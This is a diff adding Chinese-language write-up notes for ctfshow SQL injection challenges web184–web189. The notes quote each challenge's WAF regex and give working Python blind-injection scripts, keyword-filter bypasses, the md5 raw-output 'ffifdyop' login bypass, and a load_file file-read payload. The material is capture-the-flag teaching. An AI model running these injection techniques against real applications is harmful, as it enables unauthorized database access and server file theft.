@@ -1205,6 +1205,10 @@ AntSword连接，成功
 
 ### web153（未完成）
 
+
+
+
+
 ## SQL注入
 
 > 手动注入基本步骤：所有语句末尾接%23
@@ -1525,6 +1529,255 @@ for i in range(50):
 ```
 
 运行即可发现flag的值会一点一点拼出来，直到括号闭合成功后即可停止脚本执行提交flag。
+
+
+
+### web184
+
+```
+  function waf($str){
+    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
+  }
+```
+
+这题过滤了where，‘ ，",*,等符号，目的是使用左右连接查询进行注入。
+
+已知条件：flag格式：ctfshow{ 这个字符开头。
+
+好多wp和官方视频没有解释为什么要使用$user_count=43,来做判断条件，基本不好的小白就很难受了。
+
+payload: tableName= ctfshow_user as a left join ctfshow_user as b on a.pass regexp([CONCAT](https://so.csdn.net/so/search?q=CONCAT&spm=1001.2101.3001.7020)(char(99),char(116),char(42)) ) 
+
+$user_count=43. 这里根据返回结果43，就可以判断我们的payload是执行正确的，精确操作了数据表中带flag值的行：具体可以分析一下我们的payload。
+
+又得盲注了，
+
+```
+import requests
+import sys
+
+url = 'http://74cb8d43-be70-4911-becb-97bc98d25e45.challenge.ctf.show/select-waf.php'
+flag = 'ctfshow{'
+letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
+
+def asc2hex(s):
+    a1 = ''
+    a2 = ''
+    for i in s:
+        a1+=hex(ord(i))
+    a2 = a1.replace("0x","")
+    return a2
+for i in range(100):
+    for j in letter:
+        payload = {
+            "tableName":"ctfshow_user group by pass having pass like {}".format("0x"+asc2hex(flag+j+"%"))
+        }
+        r = requests.post(url=url,data=payload).text
+        if "$user_count = 1;" in r:
+            flag+=j
+            print(flag)
+            break
+            if j == "}":
+                sys.exit()
+
+```
+
+![](.\SQL注入\web184\web184.png)
+
+
+
+### web185-186
+
+```
+  function waf($str){
+    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
+  }
+```
+
+数字被过滤了，需要构造。
+
+```
+import requests
+import sys
+
+def createNum(n):
+    num = "true"
+    if n == 1:
+        return "true"
+    else:
+        for i in range(n - 1):
+            num += "+true"
+    return num
+
+
+def createstrNum(m):
+    _str = ""
+    for j in m:
+        _str += ",chr(" + createNum(ord(j)) + ")"
+    return _str[1:]
+
+
+url = "http://33db22fa-e601-49f4-a311-7ba9a21a915c.challenge.ctf.show/select-waf.php"
+letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
+flag = "ctfshow{"
+for i in range(100):
+    for j in letter:
+        data = {
+            'tableName': 'ctfshow_user group by pass having pass like concat({})'.format(createstrNum(flag + j + "%"))
+        }
+        res = requests.post(url=url, data=data).text
+        # print(res)
+        if "$user_count = 1;" in res:
+            flag += j
+            print(flag)
+            break
+        if j == "}":
+            sys.exit()
+
+```
+
+![](.\SQL注入\web185-186\web185.png)
+
+![](.\SQL注入\web185-186\web186.png)
+
+
+
+### web187
+
+```
+    $username = $_POST['username'];
+    $password = md5($_POST['password'],true);
+
+    //只有admin可以获得flag
+    if($username!='admin'){
+        $ret['msg']='用户名不存在';
+        die(json_encode($ret));
+    }
+```
+
+POST上username且必须为admin，password有md5检验。
+
+注意到md5(string,true)这个函数
+
+md5(string,raw)其中raw参数可选，且有两种选择
+
+FALSE：32位16进制的字符串
+TRUE：16位原始二进制格式的字符串
+当有true这个参数，会以二进制的形式输出16个字符。返回的这个原始二进制不是普通的0 1二进制。
+
+> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
+> 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）
+
+```
+import requests
+
+url = 'http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/select-waf.php'
+url2 = ' http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/api/'
+
+payload = {
+    "username":"admin",
+    "password":"ffifdyop"
+}
+
+#r = requests.post(url=url,data=payload)
+res = requests.post(url=url2,data=payload).text
+
+print(res)
+
+```
+
+![](.\SQL注入\web187\web187.png)
+
+### web188
+
+```
+  //用户名检测
+  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
+    $ret['msg']='用户名非法';
+    die(json_encode($ret));
+  }
+
+  //密码检测
+  if(!is_numeric($password)){
+    $ret['msg']='密码只能为数字';
+    die(json_encode($ret));
+  }
+
+  //密码判断
+  if($row['pass']==intval($password)){
+      $ret['msg']='登陆成功';
+      array_push($ret['data'], array('flag'=>$flag));
+    }
+      
+```
+
+mysql中字母与数字的比较过程：
+
+以字母为开头的字符型数据在与数字型比较时，会强制转化为0，再与数字比较（这里很类似于PHP的弱比较）
+假设我们username为0，那么就会相等，从而匹配成功
+
+在这里的password是用0来混字母开头的$row['pass']
+
+```
+import requests
+
+url = 'http://106c7788-8a93-4a71-ab55-e09f7ecddca2.challenge.ctf.show/api/'
+
+payload = {
+    "username":"0",
+    "password":"0"
+}
+
+res = requests.post(url=url,data=payload).text
+
+print(res)
+
+```
+
+![](.\SQL注入\web188\web188.png)
+
+通过检测后，waf直接给了flag
+
+
+
+### web189
+
+```
+flag在api/index.php文件中
+```
+
+```
+import requests
+import sys
+import json
+
+url = 'http://c1f50290-9488-499d-b94a-01abe27e29c0.challenge.ctf.show/api/index.php'
+flag = 'ctfshow{'
+letter = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
+
+for i in range(100):
+    for j in letter:
+        payload = {
+            "username": "if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag + j),
+            "password": "0"
+
+        }
+        r = requests.post(url=url,data=payload)
+        #print(r)
+        if "密码错误" == r.json()['msg']:
+            flag += j
+            print(flag)
+            break
+        if '}' in flag:
+            sys.exit()
+
+```
+
+
+
+![](.\SQL注入\web189\web189.png)
+
+
 
 
 
